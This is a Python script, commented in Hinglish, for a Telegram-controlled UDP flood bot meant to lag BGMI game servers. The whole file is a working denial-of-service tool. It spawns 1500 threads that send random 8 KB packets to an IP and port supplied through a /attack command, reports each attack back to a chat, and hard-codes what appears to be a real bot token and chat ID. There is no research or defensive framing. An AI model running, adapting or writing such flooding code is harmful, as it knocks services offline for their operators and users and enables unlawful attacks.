import os
import socket
import threading
import time
import requests
import random

# ------------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------------
BOT_TOKEN = "7994298191:AAEbmsKBZtHLvQ5wLu_5GtmJY6P5DWJvG7A"   # Apna Token
CHAT_ID    = "2138312113"              # Apna Chat ID

# Default Settings (Agar Telegram se na mile toh ye use honge)
DEFAULT_TARGET_PORT = 15876           
PACKET_SIZE = 8192                    
NUM_THREADS = 1500                      

# Global Variables
stop_event = threading.Event()
active_threads = []
attack_active = False
target_ip_global = ""
current_port = DEFAULT_TARGET_PORT    # Port track karne ke liye

# ------------------------------------------------------------------
# Telegram Functions
# ------------------------------------------------------------------
def send_msg(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(f"[!] Send Error: {e}")
        return False

def get_latest_update():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    try:
        r = requests.get(url, timeout=10)
        data = r.json()
        if data['ok']:
            updates = data['result']
            if updates:
                return updates[-1]
    except Exception as e:
        print(f"[!] Get Update Error: {e}")
    return None

# ------------------------------------------------------------------
# UDP Flood Worker
# ------------------------------------------------------------------
def udp_worker(target_ip, target_port):
    try:
        # UDP Socket Create karein
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Connection less nature ke liye options
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while not stop_event.is_set():
            # Random data payload bhejein
            payload = os.urandom(PACKET_SIZE)
            
            try:
                # UDP packet bhejna
                sock.sendto(payload, (target_ip, target_port))
            except Exception:
                break
        
        sock.close()
    except Exception:
        pass

# ------------------------------------------------------------------
# Main Attack Logic
# ------------------------------------------------------------------
def start_attack(ip, duration=60, port=None):
    global stop_event, active_threads, attack_active, target_ip_global, current_port

    # Agar port nahi diya gaya, toh current ya default use karein
    target_port = port if port else current_port
    
    # Purana attack band karein agar chal raha hai
    if attack_active:
        print("[*] Stopping previous attack...")
        stop_event.set()
        time.sleep(1)
        stop_event.clear()
    
    target_ip_global = ip
    current_port = target_port  # Update global port
    
    print(f"[*] Starting INSTANT UDP Flood on {ip}:{target_port} for {duration}s...")
    attack_active = True

    # Threads start karein
    print(f"[*] Spawning {NUM_THREADS} UDP threads...")
    
    for i in range(NUM_THREADS):
        t = threading.Thread(target=udp_worker, args=(ip, target_port), daemon=True)
        active_threads.append(t)
        t.start()

    send_msg(
        f"<b>🚀 BGMI UDP FLOOD ATTACK!</b>\n"
        f"Target: <code>{ip}:{target_port}</code>\n"  # Dynamic port dikhayein
        f"Method: UDP Flood\n"
        f"Duration: <code>{duration}s</code>\n"
        f"Threads: <code>{NUM_THREADS}</code>"
    )

    # Auto Stop Function
    def auto_stop():
        time.sleep(duration)
        if attack_active:
            stop_attack()

    threading.Thread(target=auto_stop, daemon=True).start()

def stop_attack():
    global stop_event, active_threads, attack_active

    if not stop_event.is_set():
        print("[*] Stopping attack...")
        stop_event.set()

        # Saare threads ko close hone ka signal dein
        for t in active_threads:
            t.join(timeout=2)

        active_threads = []
        attack_active = False
        send_msg("<b>✅ Attack Stopped!</b>")
    else:
        send_msg("⚠️ No active attack to stop.")

def main_loop():
    print(f"[*] BGMI UDP Ping High Bot is Running...")

    send_msg(
        f"<b>🎮 BGMI UDP Flood Bot</b>\n\n"
        f"Commands:\n"
        f"<code>/attack IP PORT DURATION</code>\n"
        f"<code>/stop</code>\n"
        f"<code>/status</code>"
    )

    while True:
        try:
            update = get_latest_update()

            if update:
                message = update.get('message', {})
                text = message.get('text', '').strip()

                chat_id_msg = message.get('chat', {}).get('id')
                if str(chat_id_msg) != str(CHAT_ID):
                    continue

                print(f"[+] Command: {text}")

                if text == "/start":
                    send_msg(
                        f"<b>🎮 BGMI UDP Flood Bot</b>\n\n"
                        f"Commands:\n"
                        f"<code>/attack IP PORT DURATION</code>\n"
                        f"<code>/stop</code>\n"
                        f"<code>/status</code>"
                    )

                elif text.startswith("/attack"):
                    parts = text.split()
                    # Format: /attack 20.235.145.120 15876 60
                    if len(parts) >= 2:
                        ip = parts[1]
                        
                        # Port optional hai, agar nahi diya toh default use hoga
                        port = int(parts[2]) if len(parts) > 2 else None
                        
                        # Duration optional hai, default 60 seconds
                        duration = int(parts[3]) if len(parts) > 3 else 60
                        
                        try:
                            start_attack(ip, duration, port)
                        except ValueError:
                            send_msg("❌ Invalid IP/Port/Duration format.")
                    else:
                        send_msg("❌ Usage: /attack [IP] [PORT] [DURATION]")

                elif text == "/stop":
                    stop_attack()

                elif text == "/status":
                    status = "Active" if attack_active else "Idle"
                    count = len(active_threads)
                    send_msg(f"✅ Status: {status}\nThreads Running: {count}\nTarget Port: {current_port}")

            time.sleep(2)

        except KeyboardInterrupt:
            print("\n[!] Stopping Bot...")
            stop_attack()
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    main_loop()
